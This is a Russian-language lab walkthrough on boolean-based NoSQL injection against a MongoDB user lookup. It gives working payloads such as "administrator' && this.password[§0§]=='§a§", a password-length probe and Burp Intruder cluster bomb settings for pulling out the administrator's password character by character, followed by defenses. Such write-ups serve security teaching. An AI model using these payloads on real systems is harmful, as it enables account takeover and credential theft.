<a id="goal"></a>

## 🎯 Цель

Функция просмотра пользователей работает на MongoDB и уязвима к NoSQL injection. Задача:

```text
1. Извлечь пароль пользователя administrator посимвольно.
2. Залогиниться в аккаунт administrator.
```

Учётные данные собственного аккаунта:

```text
wiener:peter
```

Подсказка лабы: пароль состоит только из строчных латинских букв.

---

<a id="theory"></a>

## 🧠 Краткая теория

Когда инъекция не отображает данные напрямую (не слепой случай), но влияет на поведение страницы, применяют **boolean-based эксфильтрацию**: превращают запрос к БД в канал «да/нет».

Механика:

```text
true-условие   → сервер показывает данные       → измеримый ответ A
false-условие  → сервер показывает ошибку       → измеримый ответ B
```

Если ответы различимы (разная длина, разное содержимое), атакующий может задавать произвольные вопросы:

```text
«Пароль начинается с a?»  → да/нет
«Вторая буква — b?»       → да/нет
```

В MongoDB внутри JS-выражения доступно всё: поля документа (`this.password`), свойства (`length`), индексация (`password[0]`). Это позволяет строить вопросы о данных, которые в ответе **не отображаются**.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Сервер строит запрос из ввода:

```javascript
this.username == '<ввод>'
```

Инъекция добавляет произвольные условия:

```javascript
this.username == 'administrator' && this.password[0]=='a'
```

Ответ содержит детали пользователя только если **оба** условия истинны. Перебирая символ на каждой позиции, собираем пароль, который никогда не показывается в ответе.

---

<a id="boolean-exfil"></a>

## 🗺 Схема булевой эксфильтрации

```text
1. Детект:        ' ломает запрос
2. Подтверждение: '+' чинит запрос
3. Boolean-пара:  && '1'=='2  vs  && '1'=='1  → разные ответы
4. Метаданные:    this.password.length → длина секрета
5. Перебор:       this.password[N]=='X' → символ за запросом
6. Сборка:        8 позиций × до 26 попыток = до ~200 запросов
```

Один вопрос за запрос — медленно, но надёжно и тихо: нет шумных UNION/ошибок, только «найден/не найден».

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка: эталонный ответ

1. Залогиниться `wiener:peter`.
2. HTTP history → `GET /user/lookup?user=wiener` → Send to Repeater.
3. Запомнить нормальный ответ: детали аккаунта wiener (JSON с полями).

Этот ответ — «эталон true», с ним сравниваются все дальнейшие.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Детект: кавычка ломает запрос

```text
user=wiener'      (Ctrl+U → wiener%27)
```

```javascript
this.username == 'wiener''   ← незакрытая кавычка → синтаксическая ошибка
```

**Ожидаем:** ошибка («Could not find user» или 500) вместо деталей.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Подтверждение: валидный JS чинит запрос

```text
user=wiener'+'    (Ctrl+U → wiener%27%2b%27)
```

```javascript
this.username == 'wiener'+''   ← валидная конкатенация
```

**Ожидаем:** детали wiener вернулись.

**Вывод:** ошибка шага 2 — ошибка DB-запроса, а не валидация. Инъекция подтверждена.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Boolean-контроль: true/false

```text
user=wiener' && '1'=='2    → false → Could not find user
user=wiener' && '1'=='1    → true  → детали wiener
```

Кавычки в `'1'=='2'` самобалансирующиеся: закрывают строку и тут же открывают новую для хвоста запроса.

**Вывод:** разные ответы на true/false = полное управление логикой запроса.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Определение длины пароля

Ключевой приём: обращение к **другому полю документа** в условии:

```text
user=administrator' && this.password.length < 30 || 'a'=='b
```

Структура:

```javascript
this.username == 'administrator' && this.password.length < 30 || 'a'=='b'
└── выбираем админа ──────────────┘└───── наше условие ─────┘└── страховка ──┘
```

`this.password.length` читает свойство документа, которого **нет в ответе**. Хвост `|| 'a'=='b` (всегда ложь) лишь балансирует синтаксис.

Протокол бинарного сужения:

```text
<30 → успех  → <15 → успех  → <9 → успех  → <8 → ошибка
Успех при <9 и ошибка при <8  →  длина пароля = 8
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Посимвольный перебор в Intruder

Пейлоад с двумя позициями:

```text
user=administrator' && this.password[§0§]=='§a§
```

Настройка Intruder:

```text
Attack type:    Cluster bomb (перебор всех комбинаций)
Payload set 1:  числа 0..7            (позиция символа)
Payload set 2:  a..z                  (буква-кандидат)
Cookie:         актуальная session=... в заголовке запроса
Payload encoding: без двойного URL-кодирования
```

Чтение результатов:

```text
Сортировка: Payload 1, затем Length
true-ответ (детали админа) длиннее false-ответа (ошибка)
→ в каждой позиции ровно один запрос выделяется по Length
→ буква из его Payload 2 — правильная
```

Собрать 8 букв по позициям 0–7 → пароль.

**Практические условия успеха:**

```text
- Свежая кука сессии в запросе (Intruder не наследует браузерную сессию)
- Не кликать по лабе во время атаки (ротация сессии ломает половину запросов)
- Один ручной тест в Repeater перед запуском:
  this.password[0]=='a' → должен отличаться от =='b' при переборе вручную
```

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Логин wiener:peter → GET /user/lookup?user=wiener в Repeater
2. wiener' → ошибка (детект)
3. wiener'+' → детали wiener (подтверждение инъекции)
4. && '1'=='2 vs && '1'=='1 → разные ответы (boolean-контроль)
5. administrator' && this.password.length < N → длина = 8
6. Intruder Cluster bomb: this.password[§N§]=='§a§ → 8 букв собраны
7. Логин administrator:<пароль> → Solved
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Ввод попадает в JS-выражение без санитизации

Конкатенация строк вместо параметризованного запроса: любые JS-конструкции исполняются движком запросов.

### 2. Внутри условия доступны поля документа

`this.password` доступно для сравнения, даже если ответ его скрывает. Фильтрация вывода ≠ фильтрация доступа к данным в условии.

### 3. Ответ различим по содержимому/длине

«Детали найдены» vs «Could not find user» — два разных наблюдаемых состояния. Это и есть boolean-оракул.

### 4. Пространство поиска мало

8 позиций × 26 букв = до ~200 запросов. Латинские строчные + известная длина сжимают задачу до тривиального перебора.

### 5. Автоматизация стандартным инструментом

Cluster bomb в Intruder — штатная функция. Спец-инструменты не нужны, только корректные payload-позиции и стабильная сессия.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Метод boolean-based эксфильтрации для любого слепого контекста:

```text
1. Найти наблюдаемое различие: длина ответа, статус, содержимое, время
2. Построить «задаватель вопросов»: && <условие> в инъекцию
3. Сначала метаданные (length), затем значения (==)
4. Сузить алфавит (hint: lowercase) и длину ДО перебора
5. Автоматизировать перебором комбинаций (Cluster bomb)
6. Проверить стабильность: одна сессия, свежие куки, без параллельных действий
```

Ключевая дисциплина: перед массовым перебором — **один ручной запрос-проверка**. Если `password[0]=='a'` и `=='b'` не различаются вручную, Intruder не спасёт — сначала чини пейлоад/куку.

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Не кодировать пейлоад

Сырые `'`, `&&`, `[` в URL ломают запрос до БД → одинаковые ответы на всё. Всегда Ctrl+U, в Intruder — следить за отсутствием двойного кодирования.

### Ошибка 2. Забыть куку сессии в Intruder

Intruder отправляет запрос как записан. Без `Cookie: session=...` все ответы «не залогинен» — одинаковые. Свежая кука обязательна; не активировать сессию параллельно в браузере.

### Ошибка 3. Неправильные маркеры позиций

`§` ушли в запрос текстом или позиция одна вместо двух → Intruder перебирает не то. Проверять: Payload positions count = 2, маркеры зелёные во вкладке Positions.

### Ошибка 4. Ожидать, что true-ответ появится по статусу

Оба ответа — 200. Различие — в **длине и содержимом** (данные vs сообщение об ошибке). Сортировать по Length, читать содержимое.

### Ошибка 5. Пропустить определение длины

Без `length` перебор слепой: неизвестно, сколько позиций собирать и когда остановиться. Метаданные сначала, значения потом.

### Ошибка 6. Оставить страховочный хвост в переборном пейлоаде

`|| 'a'=='b` из пейлоада длины не нужен в `this.password[§0§]=='§a§` — лишние кавычки ломают баланс синтаксиса при подстановке payload'ов.

<a id="defense"></a>

## 🛡 Защита

### 1. Параметризованные запросы

Структурированный фильтр вместо конкатенации:

```javascript
collection.find({ username: String(userInput) })
// никогда не собирать строки JS-выражений из ввода
```

### 2. Валидация типов и whitelist символов

Проверять тип ввода и отклонять спецсимволы JS (`'`, `&&`, `||`, `[`, `.`).

### 3. Не использовать $where с пользовательскими данными

`$where` исполняет JS на сервере — убрать или заменить обычными операторами.

### 4. Унифицированные сообщения об ошибках

«Could not find user» vs «детали» — оракул. Одинаковые ответы для не найденных и ошибочных запросов ломают boolean-канал.

### 5. Rate limiting и мониторинг аномалий

Сотни запросов к одному эндпоинту с одинаковым шаблоном — сигнал для алертов и троттлинга.

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **boolean-based syntax injection** с посимвольной эксфильтрацией:

```text
1. Инъекция подтверждена (детект → починка → boolean-пара)
2. this.password.length дал длину секрета (8)
3. this.password[N]=='X' превратил запрос в канал да/нет
4. Cluster bomb собрал 8 букв за ~200 запросов
5. Легитимный логин админом
```

Главные выводы:

```text
Слепая инъекция ≠ безвредная: да/нет-канал извлекает данные посимвольно.
```

```text
Поля документа доступны в условии, даже если скрыты в ответе — this.password доказывает это.
```

```text
Метаданные (длина) сначала, значения потом: сужение пространства поиска до перебора.
```

```text
Инструментальная дисциплина: свежая сессия, одна кодировка, ручная проверка перед автоматизацией.
```

```text
Защита: параметризация, валидация типов, единые ошибки, rate limiting.
```
